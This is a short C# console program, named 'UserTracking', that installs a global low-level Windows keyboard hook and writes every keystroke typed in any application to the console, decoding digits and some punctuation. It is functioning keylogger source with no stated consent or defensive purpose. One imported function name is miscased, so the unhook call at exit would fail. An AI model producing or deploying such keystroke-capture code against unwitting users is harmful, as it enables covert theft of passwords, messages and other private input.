using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;

namespace UserTracking
{
    class Program
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;

        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookwindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                }
                else if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift)
                {
                    Console.Out.Write("^");
                }
                else if (((Keys)vkCode).ToString() == "D1")
                {
                    Console.Out.Write("1");
                }
                else if (((Keys)vkCode).ToString() == "D2")
                {
                    Console.Out.Write("2");
                }
                else if (((Keys)vkCode).ToString() == "D3")
                {
                    Console.Out.Write("3");
                }
                else if (((Keys)vkCode).ToString() == "D4")
                {
                    Console.Out.Write("4");
                }
                else if (((Keys)vkCode).ToString() == "D5")
                {
                    Console.Out.Write("5");
                }
                else if (((Keys)vkCode).ToString() == "D6")
                {
                    Console.Out.Write("6");
                }
                else if (((Keys)vkCode).ToString() == "D7")
                {
                    Console.Out.Write("7");
                }
                else if (((Keys)vkCode).ToString() == "D8")
                {
                    Console.Out.Write("8");
                }
                else if (((Keys)vkCode).ToString() == "D9")
                {
                    Console.Out.Write("9");
                }
                else if (((Keys)vkCode).ToString() == "D0")
                {
                    Console.Out.Write("0");
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                }

                //int caseSwitch = 1;

                //switch (caseSwitch)
                //{
                //    case 1:
                //        Console.WriteLine("##");
                //        break;
                //}
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookwindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}